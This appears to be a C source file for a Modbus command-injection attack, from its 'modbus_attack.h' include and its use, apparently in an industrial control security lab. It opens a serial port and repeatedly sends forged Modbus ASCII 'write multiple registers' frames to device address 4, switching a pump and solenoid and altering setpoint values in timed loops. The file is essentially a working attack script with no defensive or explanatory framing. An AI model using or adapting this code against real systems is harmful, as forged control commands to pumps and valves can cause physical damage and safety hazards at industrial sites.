#define FORLINUX

#include "modbus.h"
#include "modbus_attack.h"

void device(int rtu, struct timespec req, struct timespec rem);

int main(int argc, char *argv[]){

  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];
  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;
  int cnt1, cnt2, cnt3, cnt4, cnt5;

  strcpy(inport,"/dev/ttyUSB0");
  strcpy(outport,"/dev/ttyUSB2");

   for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len);
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      }
      strncpy(outport, argv[i+1],len);
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) {
   return (port);
  }
  printf("open %s ok port = %d\n", outport, port);
  
  char *str;
  unsigned char lrc, top, bottom;

  addr = (unsigned char) 0x04;
  fc = (unsigned char) 0x010;
  datalen = 41;
  for(cnt1=0; cnt1<91;cnt1++){  //pump
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x12;
    data[4] = 0x24;
    data[5] = 0x00;
    data[6] = 0x00;
    data[7] = 0x00;
    data[8] = 0x01; //pump
    data[9] = 0x00;
    data[10] = 0x01; // auto mode
    data[11] = 0x00; 
    data[12] = 0x01;  //soliend
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x00;
    

    data[16] = 0x00;
    data[17] = 0x40;
    data[18] = 0x04;
    data[19] = 0x00;
    data[20] = 0x00;
    data[21] = 0x73;
    data[22] = 0x00;
    data[23] = 0x00;
    data[24] = 0x00;
    data[25] = 0x3e;
    data[26] = 0x4c;
    data[27] = 0xcc;
    data[28] = 0xcd;
    data[29] = 0x00;
    data[30] = 0x00;
    data[31] = 0x00;
   
    data[32] = 0x00;
    data[33] = 0x3f;
    data[34] = 0x00;
    data[35] = 0x00;
    data[36] = 0x00;
    data[37] = 0x3f;
    data[38] = 0x80;
    data[39] = 0x00;
    data[40] = 0x00;
 
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);

   /* data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x12;
    data[4] = 0x24;
    data[5] = 0x00;
    data[6] = 0x00;
    data[7] = 0x00;
    data[8] = 0x01; //pump soliend
    data[9] = 0x00;
    data[10] = 0x02; // auto mode
    data[11] = 0x00; 
    data[12] = 0x01;  //pump
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x00;
    

    data[16] = 0x00;
    data[17] = 0x42;
    data[18] = 0xa0;
    data[19] = 0x00;
    data[20] = 0x00;
    data[21] = 0x73;
    data[22] = 0x00;
    data[23] = 0x00;
    data[24] = 0x00;
    data[25] = 0x3e;
    data[26] = 0x4c;
    data[27] = 0xcc;
    data[28] = 0xcd;
    data[29] = 0x00;
    data[30] = 0x00;
    data[31] = 0x00;
   
    data[32] = 0x00;
    data[33] = 0x3f;
    data[34] = 0x00;
    data[35] = 0x00;
    data[36] = 0x00;
    data[37] = 0x3f;
    data[38] = 0x80;
    data[39] = 0x00;
    data[40] = 0x00;
 
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(5);*/
  }
  for(cnt1=91; cnt1<100;cnt1++){  //pump
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x12;
    data[4] = 0x24;
    data[5] = 0x00;
    data[6] = 0x00;
    data[7] = 0x00;
    data[8] = 0x01; //pump
    data[9] = 0x00;
    data[10] = 0x01; // auto mode
    data[11] = 0x00; 
    data[12] = 0x01;  //soliend
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x00;
    

    data[16] = 0x00;
    data[17] = 0x40;
    data[18] = 0x82;
    data[19] = 0x00;
    data[20] = 0x00;
    data[21] = 0x73;
    data[22] = 0x00;
    data[23] = 0x00;
    data[24] = 0x00;
    data[25] = 0x3e;
    data[26] = 0x4c;
    data[27] = 0xcc;
    data[28] = 0xcd;
    data[29] = 0x00;
    data[30] = 0x00;
    data[31] = 0x00;
   
    data[32] = 0x00;
    data[33] = 0x3f;
    data[34] = 0x00;
    data[35] = 0x00;
    data[36] = 0x00;
    data[37] = 0x3f;
    data[38] = 0x80;
    data[39] = 0x00;
    data[40] = 0x00;
 
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);
 }
}
